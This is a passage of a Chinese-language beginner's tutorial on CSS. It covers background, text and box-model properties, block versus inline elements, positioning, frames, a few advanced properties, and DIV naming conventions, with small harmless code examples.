<li>垂直方向平铺：<code>background-repeat:repeat-y;</code></li>
<li>完全平铺：默认为完全平铺</li>
</ul>
</li>
<li>
<p>背景图片的定位</p>
<ul>
<li>背景图片的定位就是可以设置显示背景图片的位置，通过属性<code>background-position</code>来实现</li>
<li><code>background-position</code>的取值可为英文单词或者数值和百分值。</li>
<li><code>background-positon</code>的英文单词取值</li>
<li><code>top left</code></li>
<li><code>top center</code></li>
<li><code>top right</code></li>
<li><code>center left</code></li>
<li><code>center center</code></li>
<li><code>center right</code></li>
<li><code>bottom left</code></li>
<li><code>bottom center</code></li>
<li><code>ottom right</code></li>
</ul>
</li>
<li>
<p><code>background-positon</code>的数值取值</p>
<ul>
<li><code>background-position:x y;</code></li>
</ul>
</li>
<li>
<p><code>positon</code>的百分值取值</p>
<ul>
<li><code>background-position:x% y%;</code></li>
</ul>
</li>
<li>
<p>背景图片的大小</p>
<ul>
<li>背景图片的大小可以通过属性<code>background-size</code>来设置<code>background-size</code>的取值可为数值和百分值。</li>
</ul>
</li>
<li>
<p><code>background-size</code>的数值取值</p>
<ul>
<li><code>background-size:x y;</code></li>
</ul>
</li>
<li>
<p><code>background-size</code>的数值取值</p>
<ul>
<li><code>background-size:x% y%;</code></li>
</ul>
</li>
<li>
<p>背景图片的滚动</p>
<ul>
<li>
<p>背景图片是否随着内容的滚动而滚动由<code>background-attachment</code>设置</p>
</li>
<li>
<p><code>background-attachment:fixed;</code>  固定，不随内容的滚动而滚动</p>
</li>
<li>
<p><code>background-attachment:scroll;</code> 滚动，随内容的滚动而滚动</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十二章-文字文本属性"><a class="markdownIt-Anchor" href="#第十二章-文字文本属性"></a> 第十二章 文字文本属性</h4>
<hr />
<ul>
<li>
<p><code>css</code>文字文本属性：</p>
<ul>
<li>
<p><strong>文字属性</strong></p>
<ul>
<li><code>color:red;</code>	文字颜色</li>
<li><code>font-size:12px</code>;	文字大小</li>
<li><code>font-weight:“bold”</code>	文字粗细(<code>bold/normal</code>)</li>
<li><code>font-family:“宋体”</code>	文字字体</li>
<li><code>font-variant:small-caps</code>小写字母以大写字母显示</li>
</ul>
</li>
<li>
<p><strong>文本属性</strong></p>
<ul>
<li><code>text-align:center;</code>   文本对齐(<code>right</code>/<code>left</code>/<code>center</code>)</li>
<li><code>line-height:10px;</code> 行间距(可通过它实现文本的垂直居中)</li>
<li><code>text-indent:20px;</code>  首行缩进</li>
<li><code>text-decoration:none;</code>
<ul>
<li>文本线(<code>none</code>/<code>underline</code>/<code>overline</code>/<code>line-through</code>)</li>
</ul>
</li>
<li><code>letter-spacing</code>:   字间距</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十三章-盒子模型"><a class="markdownIt-Anchor" href="#第十三章-盒子模型"></a> 第十三章 盒子模型</h4>
<hr />
<ul>
<li>
<p><strong>盒子模型</strong></p>
<ul>
<li>盒子模型就是一个有高度和宽度的矩形区域</li>
<li>所有<code>html</code>标签都是盒子模型</li>
<li><code>div</code>标签自定义盒子模型</li>
</ul>
</li>
<li>
<p>所有的标签都是盒子模型</p>
<ul>
<li><code>class</code>和<code>id</code>的主要差别是：<code>class</code>用于元素组（类似的元素，或者可以理解为某一类元素），而<code>id</code>用于标识单独的唯一的元素。</li>
</ul>
</li>
<li>
<p><strong>盒子模型的组成</strong></p>
<ul>
<li>盒子模型组成部分：
<ul>
<li>自身内容：<code>width</code>、h<code>eight</code> 宽高</li>
<li>内边距：   <code>padding</code></li>
<li>盒子边框： <code>border</code> 边框线</li>
<li>与其他盒子距离：  <code>margin</code>外边距</li>
<li>内容+内边距+边框+外边距=面积</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>border</code> 边框</p>
<ul>
<li>常见写法  <code>border:1px solid #f00;</code></li>
</ul>
</li>
<li>
<p>单独属性：</p>
</li>
<li>
<p><code>border-width</code>:</p>
</li>
<li>
<p><code>border-style:</code></p>
<ul>
<li><code>dotted</code> 点状虚线</li>
<li><code>dashed</code>（虚线）</li>
<li><code>solid</code>（实线）</li>
<li><code>double</code>（双实线）</li>
</ul>
</li>
<li>
<p><code>border-color</code> (颜色)</p>
</li>
<li>
<p><code>padding</code> 内边距</p>
<ul>
<li>
<p>值：<code>像素</code>/<code>厘米</code>等长度单位、百分比</p>
<ul>
<li><code>padding:10px;</code>	                  上下左右</li>
<li><code>padding:10px 10px;</code>                 上下  左右</li>
<li><code>padding:10px 10px 10px;</code>         上 左右 下</li>
<li><code>padding:10px 10px 10px 10px;</code> 上 右 下 左（设置4个点–&gt;顺时针方向）</li>
</ul>
</li>
</ul>
</li>
<li>
<p>单独属性：</p>
<ul>
<li><code>padding-top:</code></li>
<li><code>padding-right:</code></li>
<li><code>padding-bottom:</code></li>
<li><code>padding-left:</code></li>
</ul>
</li>
<li>
<p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据<code>width</code>和<code>height</code>减小</p>
</li>
<li>
<p>margin 外边距</p>
<ul>
<li>
<p>值：与<code>padding</code>相同</p>
</li>
<li>
<p>单独属性：与<code>padding</code>相同</p>
</li>
</ul>
</li>
<li>
<p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并</p>
</li>
</ul>
<hr />
<p><strong>补充盒子模型内容</strong></p>
<hr />
<ul>
<li>
<p><strong>标准盒子模型</strong></p>
</li>
<li>
<p>盒子模型是<code>css</code>中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 <code>ie</code>盒子模型和标准 <code>w3c</code> 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型</p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-320bad065d62c499.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<ul>
<li>
<p>从上图可以看到标准 <code>w3c</code> 盒子模型的范围包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，并且 <code>content</code>部分不包含其他部分</p>
</li>
<li>
<p>** IE盒子模型**</p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-693242e2f03506f8.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<ul>
<li>
<p>从上图可以看到 <code>ie</code>盒子模型的范围也包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code></p>
</li>
<li>
<p>和标准 <code>w3c</code> 盒子模型不同的是：<code>ie</code> 盒子模型的 <code>content</code> 部分包含了 <code>border</code>和 <code>padding</code></p>
</li>
<li>
<p><code>IE</code>盒子模型<code>width</code> = <code>padding</code>+<code>border</code>+<code>内容</code></p>
</li>
<li>
<p>标准盒子模型 = 内容的宽度（不包含<code>border</code>+<code>padding</code>）</p>
</li>
<li>
<p>例：</p>
</li>
<li>
<p>一个盒子的   <code>margin</code>为 20px，<code>border</code> 为 1px，<code>padding</code>为 10px，<code>content</code> 的宽为 200px、高为 50px，假如用标准 <code>w3c</code> 盒子模型解释，那么这个盒子需要占据的位置为：宽 <code>20*2+1*2+10*2+200=262px</code>、高 <code>20*2+1*2*10*2+50=112px</code>，盒子的实际大小为：宽 <code>1*2+10*2+200=222px</code>、高 <code>1*2+10*2+50=72px</code>；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 <code>20*2+200=240px</code>、高 <code>20*2+50=70px</code>，盒子的实际大小为：宽 <code>200px</code>、高 <code>50px</code></p>
</li>
<li>
<p>那应该选择哪中盒子模型呢？当然是“标准 <code>w3c</code> 盒子模型”了。怎么样才算是选择了“标准 <code>w3c</code>盒子模型”呢？很简单，就是在网页的顶部加上 <code>doctype</code> 声明。</p>
</li>
<li>
<p>假如不加<code>doctype</code> 声明，那么各个浏览器会根据自己的行为去理解网页，即 <code>ie</code>浏览器会采用 <code>ie</code> 盒子模型去解释你的盒子，而 <code>ff</code>会采用标准<code>w3c</code> 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。</p>
</li>
<li>
<p>反之，假如加上了 <code>doctype</code> 声明，那么所有浏览器都会采用标准 <code>w3c</code>盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。</p>
</li>
</ul>
<hr />
<ul>
<li>用 <code>jquery</code> 做的例子来证实一下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;你用的盒子模型是？&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; src&#x3D;&quot;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt;</span><br><span class="line">var sbox &#x3D; $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;</span><br><span class="line">document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>上面的代码没有加上 <code>doctype</code> 声明，在 <code>ie</code> 浏览器中显示  <code>ie</code>盒子模型，在 ff 浏览器中显示“标准<code>w3c</code> 盒子模型”。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html public &quot;-&#x2F;&#x2F;w3c&#x2F;&#x2F;dtd xhtml 1.0 transitional&#x2F;&#x2F;en&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;tr&#x2F;xhtml1&#x2F;dtd&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;你用的盒子模型是标准w3c盒子模型&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; src&#x3D;&quot;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt;</span><br><span class="line">var sbox &#x3D; $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;</span><br><span class="line">document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>代码2 与代码1 唯一的不同的就是顶部加了 <code>doctype</code>声明。在所有浏览器中都显示“标准 <code>w3c</code>盒子模型”</p>
</li>
<li>
<p>所以为了让网页能兼容各个浏览器，让我们用标准 <code>w3c</code> 盒子模型</p>
</li>
<li>
<p>扩展</p>
<ul>
<li><a href="http://www.jianshu.com/p/e2eb0d8c9de6" target="_blank" rel="noopener">学会使用box-sizing布局</a></li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十四章-块元素-行元素与溢出"><a class="markdownIt-Anchor" href="#第十四章-块元素-行元素与溢出"></a> 第十四章 块元素、行元素与溢出</h4>
<hr />
<ul>
<li>
<p>基本概念</p>
<ul>
<li>块级元素：默认情况下独占一行的元素，可控制宽高、上下边距；</li>
<li>行内元素：默认情况下一行可以摆放多个的元素，不可控制宽高和上下边距</li>
</ul>
</li>
<li>
<p>行块转换</p>
<ul>
<li><code>display:none</code>;  不显示</li>
<li><code>display:block</code>; 变成块级元素</li>
<li><code>display:inline</code>; 变成行级元素</li>
<li><code>display:inline-block</code>; 以块级元素样式展示，以行级元素样式排列</li>
</ul>
</li>
<li>
<p>溢出</p>
<ul>
<li><code>overflow:hidden</code>;   溢出隐藏</li>
<li><code>overflow:scroll</code>;   内容会被修剪，浏览器会显示滚动条</li>
<li><code>overflow:auto</code>;   如果内容被修剪，则产生滚动条</li>
</ul>
</li>
<li>
<p>文本不换行：<code>white-space:nowrap</code>;</p>
</li>
<li>
<p>长单词换行：<code>word-wrap:break-word</code>;</p>
</li>
<li>
<p>行内元素和快级元素小结</p>
</li>
<li>
<p>一、<strong>块级元素</strong>：block element</p>
<ul>
<li>
<p>每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（<code>float</code>浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素；</p>
</li>
<li>
<p>块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。</p>
</li>
<li>
<p><code>DIV</code> 是最常用的块级元素，元素样式的<code>display:block</code>都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。</p>
</li>
</ul>
</li>
<li>
<p>二、<strong>行内元素</strong>：inline element</p>
<ul>
<li>也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 <code>SPAN</code>元素，<code>IFRAME</code>元素和元素样式的<code>display : inline</code>的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。</li>
</ul>
</li>
<li>
<p>三、<strong>block（块）元素的特点:</strong></p>
<ul>
<li>①、总是在新行上开始；</li>
<li>②、高度，行高以及外边距和内边距都可控制；</li>
<li>③、宽度缺省是它的容器的100%，除非设定一个宽度。</li>
<li>④、它可以容纳内联元素和其他块元素</li>
</ul>
</li>
<li>
<p>四、<strong>inline元素的特点</strong></p>
<ul>
<li>①、和其他元素都在一行上；</li>
<li>②、高，行高及外边距和内边距不可改变；</li>
<li>③、宽度就是它的文字或图片的宽度，不可改变</li>
<li>④、内联元素只能容纳文本或者其他内联元素</li>
</ul>
</li>
<li>
<p><strong>对行内元素，需要注意如下</strong>:</p>
<ul>
<li>设置宽度<code>width</code> 无效。 设置高度<code>height</code>无效，可以通过<code>line-height</code>来设置。 设置<code>margin</code></li>
<li>只有左右<code>margin</code>有效，上下无效。</li>
<li>设置<code>padding</code>只有左右<code>padding</code>有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。</li>
</ul>
</li>
<li>
<p>五、<strong>常见的块状元素</strong></p>
<ul>
<li><code>address</code> – 地址</li>
<li><code>blockquote</code> – 块引用</li>
<li><code>center</code> – 举中对齐块</li>
<li><code>dir</code> – 目录列表</li>
<li><code>div</code> – 常用块级容易，也是<code>CSS layout</code>的主要标签</li>
<li><code>dl</code> – 定义列表</li>
<li><code>fieldset</code> – <code>form</code>控制组</li>
<li><code>form</code> – 交互表单</li>
<li><code>h1</code> – 大标题</li>
<li><code>h2</code> – 副标题</li>
<li><code>h3</code> – 3级标题</li>
<li><code>h4</code> – 4级标题</li>
<li><code>h5</code> – 5级标题</li>
<li><code>h6</code> – 6级标题</li>
<li><code>hr</code> – 水平分隔线</li>
<li><code>isindex</code> – <code>input prompt</code></li>
<li><code>menu</code> – 菜单列表</li>
<li><code>noframes</code> – <code>frames</code>可选内容，（对于不支持frame的浏览器显示此区块内容</li>
<li><code>noscript</code> – 可选脚本内容（对于不支持<code>script</code>的浏览器显示此内容）</li>
<li><code>ol</code> – 有序表单</li>
<li><code>p</code> – 段落</li>
<li><code>pre</code> – 格式化文本</li>
<li><code>table</code> – 表格</li>
<li><code>ul</code> – 无序列表</li>
</ul>
</li>
<li>
<p>六、<strong>常见的内联元素</strong></p>
<ul>
<li><code>a</code> – 锚点</li>
<li><code>abbr</code> – 缩写</li>
<li><code>acronym</code> – 首字</li>
<li><code>b</code> – 粗体(不推荐)</li>
<li><code>bdo</code> – <code>bidi override</code></li>
<li><code>big</code> – 大字体</li>
<li><code>br</code> – 换行</li>
<li><code>cite</code> – 引用</li>
<li><code>code</code> – 计算机代码(在引用源码的时候需要)</li>
<li><code>dfn</code> – 定义字段</li>
<li><code>em</code> – 强调</li>
<li><code>font</code> – 字体设定(不推荐)</li>
<li><code>i</code> – 斜体</li>
<li><code>img</code> – 图片</li>
<li><code>input</code> – 输入框</li>
<li><code>kbd</code> – 定义键盘文本</li>
<li><code>label</code> – 表格标签</li>
<li><code>q</code> – 短引用</li>
<li><code>s</code> – 中划线(不推荐)</li>
<li><code>samp</code> – 定义范例计算机代码</li>
<li><code>select</code> – 项目选择</li>
<li><code>small</code> – 小字体文本</li>
<li><code>span</code> – 常用内联容器，定义文本内区块</li>
<li><code>strike</code> – 中划线</li>
<li><code>strong</code> – 粗体强调</li>
<li><code>sub</code> – 下标</li>
<li><code>sup</code> – 上标</li>
<li><code>textarea</code> – 多行文本输入框</li>
<li><code>tt</code> – 电传文本</li>
<li><code>u</code> – 下划线</li>
</ul>
</li>
<li>
<p>七，<strong>可变元素</strong></p>
<ul>
<li>可变元素为根据上下文语境决定该元素为块元素或者内联元素。</li>
<li><code>applet</code> - <code>java applet</code></li>
<li><code>button</code> - 按钮</li>
<li><code>del</code>- 删除文本</li>
<li><code>iframe</code> - <code>inline frame</code></li>
<li><code>ins</code> - 插入的文本</li>
<li><code>map</code> - 图片区块(<code>map</code>)</li>
<li><code>object</code> - <code>object</code>对象</li>
<li><code>script</code> - 客户端脚本</li>
</ul>
</li>
<li>
<p>八、<strong>行内元素与块级元素有什么不同</strong></p>
<ul>
<li>
<p>区别一：</p>
<ul>
<li>块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度</li>
<li>行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。</li>
</ul>
</li>
<li>
<p>区别二：</p>
<ul>
<li>块级：块级元素可以设置宽高</li>
<li>行内：行内元素不可以设置宽高</li>
</ul>
</li>
<li>
<p>区别三：</p>
<ul>
<li>块级：块级元素可以设置<code>margin</code>，<code>padding</code></li>
<li>行内：行内元素水平方向的<code>margin-left;</code> <code>margin-right;</code></li>
</ul>
</li>
<li>
<p><code>padding-left;</code> <code>padding-right</code>;可以生效。但是竖直方向的<code>margin-bottom</code>; <code>margin-top</code>; <code>padding-top</code>; <code>padding-bottom</code>;却不能生效。</p>
</li>
<li>
<p>区别四：</p>
</li>
<li>
<p>块级：<code>display:block</code>;</p>
</li>
<li>
<p>行内：<code>display:inline</code>;</p>
</li>
</ul>
</li>
<li>
<p>替换元素有如下：（和<code>img</code>一样的设置方法）</p>
</li>
<li>
<p><code>&lt;img&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code></p>
</li>
<li>
<p><code>&lt;object&gt;</code>都是替换元素，这些元素都没有实际的内容</p>
</li>
<li>
<p>可以通过修改<code>display</code>属性来切换块级元素和行内元素</p>
</li>
</ul>
<hr />
<h4 id="第十五章-定位"><a class="markdownIt-Anchor" href="#第十五章-定位"></a> 第十五章 定位</h4>
<hr />
<ul>
<li>
<p><code>static</code>静态定位（不对它的位置进行改变，在哪里就在那里）</p>
<ul>
<li>默认值。没有定位，元素出现在正常的流中（忽略 <code>top</code>,<code>bottom,</code>  <code>left, right</code> 或者 <code>z-index</code> 声明）。</li>
</ul>
</li>
<li>
<p><code>fixed</code>固定定位（参照物–浏览器窗口）—做 弹窗广告用到</p>
<ul>
<li>生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 <code>&quot;left&quot;</code>, <code>&quot;top&quot;</code>, <code>&quot;right&quot;</code>以及 <code>&quot;bottom&quot;</code>属性进行规定。</li>
</ul>
</li>
<li>
<p><code>relative</code>（相对定位 ）（参照物以他本身）</p>
<ul>
<li>生成相对定位的元素，相对于其正常位置进行定位。</li>
</ul>
</li>
<li>
<p><code>absolute</code>（绝对定位）(除了<code>static</code>都可以，找到参照物–&gt;与它最近的已经有定位的父元素进行定位)</p>
</li>
<li>
<p>生成绝对定位的元素，相对于 <code>static</code> 定位以外的第一个父元素进行定位。</p>
</li>
<li>
<p>元素的位置通过 &quot;<code>left&quot;</code>, <code>&quot;top&quot;</code>, <code>&quot;right&quot;</code> 以及 <code>&quot;bottom&quot;</code> 属性进行规定</p>
</li>
<li>
<p>z-index</p>
<ul>
<li><code>z-index</code> 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。</li>
<li>定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</li>
</ul>
</li>
<li>
<p>一切皆为框</p>
<ul>
<li>块级元素: <code>div</code>、<code>h1</code>或<code>p</code>元素 即：显示为一块内容称之为 “块框“ ;</li>
<li>行内元素: <code>span</code>,<code>strong</code>,<code>a</code>等元素 即：内容显示在行中称 “行内框”;</li>
<li>使用display属性改变成框的类型 即：<code>display:block</code>; 让行内元素设置为块级元素，<code>display:none;</code> 没有框</li>
</ul>
</li>
<li>
<p>相对定位：</p>
<ul>
<li>如果对一个元素进行相对定位，它将出现在它所在的位置上。</li>
<li>通过设置垂直或水平位置，让这个元素“相对于”它的起点进行移动</li>
<li><code>.adv_relative { position: relative; left: 30px; top: 20px; }</code></li>
</ul>
</li>
<li>
<p>绝对定位：</p>
<ul>
<li>元素的位置相对于最近的已定位祖先元素，如果元素没有已定位 的祖先元素，它的位置相对于最初的包含块。 <code>.adv_absolute { position: absolute; left: 30px; top: 20px; }</code></li>
</ul>
</li>
</ul>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-f72c1c8486445df1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /><br />
<img src="http://upload-images.jianshu.io/upload_images/1480597-7ab9cda0bbd7e62f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<hr />
<h4 id="第十六章-框架"><a class="markdownIt-Anchor" href="#第十六章-框架"></a> 第十六章 框架</h4>
<hr />
<ul>
<li>
<p><code>frameset</code>框架：</p>
<ul>
<li><code>&lt;frameset&gt;</code> ----  用来定义一个框架；双标签<br />
不能和  <code>&lt;body&gt;</code>  一起使用</li>
</ul>
</li>
<li>
<p><code>rows</code>、<code>cols</code>属性</p>
<ul>
<li><code>rows</code> 定义行表示框架有多少行（取值 <code>px</code>/ <code>%</code>/ <code>*</code> ）</li>
<li><code>cols</code>   定义列表示框架有多少列（取值<code>px</code>/ <code>%</code>/ <code>*</code> ）</li>
</ul>
</li>
<li>
<p>frame子框架</p>
<ul>
<li>&lt;<code>frame</code>&gt;  ----  表示框架中的某一个部分；单标签，要跟结束标志
<ul>
<li><code>src</code> 显示的网页的路径</li>
<li><code>name</code> 框架名</li>
<li><code>frameborder</code>  边框线（取值 0 / 1）</li>
</ul>
</li>
</ul>
</li>
<li>
<p>&lt;<code>noframes</code>&gt;属性</p>
</li>
<li>
<p>&lt;<code>noframes</code>&gt; 提供不支持框架的浏览器显示<code>body</code>的内容；双标签</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;frameset&gt;</span><br><span class="line">     &lt;frame  src&#x3D;“”  &#x2F;&gt;</span><br><span class="line">     &lt;frame  src&#x3D;“” &#x2F;&gt;</span><br><span class="line">     &lt;frame  src&#x3D;“” &#x2F;&gt;</span><br><span class="line">     &lt;noframes&gt;</span><br><span class="line">      &lt;body&gt;内容&lt;&#x2F;body&gt;</span><br><span class="line">     &lt;&#x2F;noframes&gt;</span><br><span class="line">&lt;&#x2F;frameset&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;iframe&gt;</code>内联框架
<ul>
<li><code>iframe</code>元素会创建包含另外一个文档的内联框架（即行内框架）</li>
<li>允许和 <code>body</code> 一起使用</li>
<li><code>width</code> 宽（取值 px / %）</li>
<li><code>height</code> 高（取值 px / %）</li>
<li><code>name</code> 框架名</li>
<li><code>frameborder</code> 边框线（取值 0 / 1）</li>
<li><code>src</code> 显示的网页的路径</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第十七章-css高级属性"><a class="markdownIt-Anchor" href="#第十七章-css高级属性"></a> 第十七章 css高级属性</h4>
<hr />
<ul>
<li><code>opacity</code>透明属性</li>
<li><code>opacity</code>
<ul>
<li>对于<code>IE6/7/</code>，使用<code>filter:alpha(opacity:值;</code>)  值为<code>0-100</code></li>
<li>对于<code>Webkit</code>，<code>Opera</code>，<code>Firefox</code>，<code>IE9+</code>，使用<code>opacity</code>:值; 值为<code>0-1</code></li>
<li>对于早期火狐，使用<code>-moz-opacity</code>:值; 值为<code>0-1</code></li>
<li>所以写透明属性时，一般写法是</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#123;	</span><br><span class="line">    opacity:0.5;</span><br><span class="line">   filter:alpha(opacity：50);&#x2F;*0-100*&#x2F;</span><br><span class="line">   -moz-opacity:0.5;	&#x2F;*取值0-1*&#x2F;--&gt;针对早起版本的火狐兼容问题的解决</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>border-radius</code>圆角边框属性</p>
<ul>
<li>向 <code>div</code> 元素添加圆角边框
<ul>
<li><code>border-radius:10px</code>;</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>box-shadow</code>阴影属性</p>
<ul>
<li>
<p><code>box-shadow</code>属性向框添加阴影效果,后面跟4个参数。</p>
</li>
<li>
<p><code>box-shadow:0px 0px 10px #000;</code></p>
</li>
</ul>
</li>
<li>
<p><code>&lt;embed&gt;</code>属性</p>
<ul>
<li>
<p>是<code>HTML5</code>中新增的标签,媒体嵌入插件标签，可以通过<code>&lt;embed&gt;</code>插入音频或视频</p>
</li>
<li>
<p><code>&lt;embed src=“media/music.mp3” /&gt;</code></p>
</li>
<li>
<p>格式<code>.mid</code> <code>.wav</code> <code>.mp3</code>等</p>
</li>
</ul>
</li>
</ul>
<hr />
<ul>
<li><strong>CSS部分导图总结</strong></li>
</ul>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-4b55b5085a7d0c56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<hr />
<ul>
<li><a href="https://yunpan.cn/cM9va2bHD4wwu" target="_blank" rel="noopener">原文件下载地址</a>   访问密码 342a</li>
</ul>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-a893d4023c39c78a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>
<hr />
<ul>
<li><code>css</code>常见简写</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-cbce5ef927ab2589.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="css简写速查" /></p>
<hr />
<h3 id="第三部分-附录"><a class="markdownIt-Anchor" href="#第三部分-附录"></a> 第三部分 附录</h3>
<hr />
<h4 id="附录一-div命名规范"><a class="markdownIt-Anchor" href="#附录一-div命名规范"></a> 附录一 DIV命名规范</h4>
<hr />
<ul>
<li>
<p>企业<code>DIV</code>使用频率高的命名方法</p>
</li>
<li>
<p><strong>网页内容类</strong></p>
<ul>
<li>
<p>标题: <code>title</code></p>
<ul>
<li>摘要: <code>summary</code></li>
<li>箭头： <code>arrow</code></li>
<li>商标： <code>label</code></li>
<li>网站标志： <code>logo</code></li>
<li>转角/圆角：<code>corner</code></li>
<li>横幅广告： <code>banner</code></li>
<li>子菜单： <code>subMenu</code></li>
<li>搜索： <code>search</code></li>
<li>搜索框： <code>searchBox</code></li>
<li>登录： <code>login</code></li>
<li>登录条：<code>loginbar</code></li>
<li>工具条： <code>toolbar</code></li>
<li>下拉： <code>drop</code></li>
<li>标签页： <code>tab</code></li>
<li>当前的： <code>current</code></li>
<li>列表： <code>list</code></li>
<li>滚动： <code>scroll</code></li>
<li>服务： <code>service</code></li>
<li>提示信息： <code>msg</code></li>
<li>热点：<code>hot</code></li>
<li>新闻： <code>news</code></li>
<li>小技巧： <code>tips</code></li>
<li>下载： <code>download</code></li>
<li>栏目标题： <code>title</code></li>
<li>热点： <code>hot</code></li>
<li>加入：<code>joinus</code></li>
<li>注册： <code>regsiter</code></li>
<li>指南： <code>guide</code></li>
<li>友情链接： <code>friendlink</code></li>
<li>状态： <code>status</code></li>
<li>版权： <code>copyright</code></li>
<li>按钮： <code>btn</code></li>
<li>合作伙伴： <code>partner</code></li>
<li>投票： <code>vote</code></li>
<li>左右中：<code>left</code>  <code>right</code>  <code>center</code></li>
</ul>
<hr />
</li>
<li>
<p>注释的写法: <code>/* Footer */</code> 内容区<code>/* End Footer */</code></p>
</li>
</ul>
</li>
<li>
<p><strong>id的命名:</strong></p>
<ul>
<li>
<p>页面结构</p>
<ul>
<li>容器: <code>container</code></li>
<li>页头：<code>header</code></li>
<li>内容：<code>content</code>/<code>container</code></li>
<li>页面主体：<code>main</code></li>
<li>页尾：<code>footer</code></li>
<li>导航：<code>nav</code></li>
<li>侧栏：<code>sidebar</code></li>
<li>栏目：<code>column</code></li>
<li>页面外围控制整体布局宽度：<code>wrapper</code></li>
<li>左右中：<code>left</code> <code>right</code> <code>center</code></li>
</ul>
</li>
</ul>
<hr />
<ul>
<li>
<p>导航</p>
<ul>
<li>导航：<code>nav</code></li>
<li>主导航：<code>mainbav</code></li>
<li>子导航：<code>subnav</code></li>
<li>顶导航：<code>topnav</code></li>
<li>边导航：<code>sidebar</code></li>
<li>左导航：<code>leftsidebar</code></li>
<li>右导航：<code>rightsidebar</code></li>
<li>菜单：<code>menu</code></li>
<li>子菜单：<code>submenu</code></li>
<li>标题: <code>title</code></li>
<li>摘要: <code>summary</code></li>
</ul>
</li>
</ul>
<hr />
<ul>
<li>
<p>功能</p>
<ul>
<li>标志：<code>logo</code></li>
<li>广告：<code>banner</code></li>
<li>登陆：<code>login</code></li>
<li>登录条：<code>loginbar</code></li>
<li>注册：<code>regsiter</code></li>
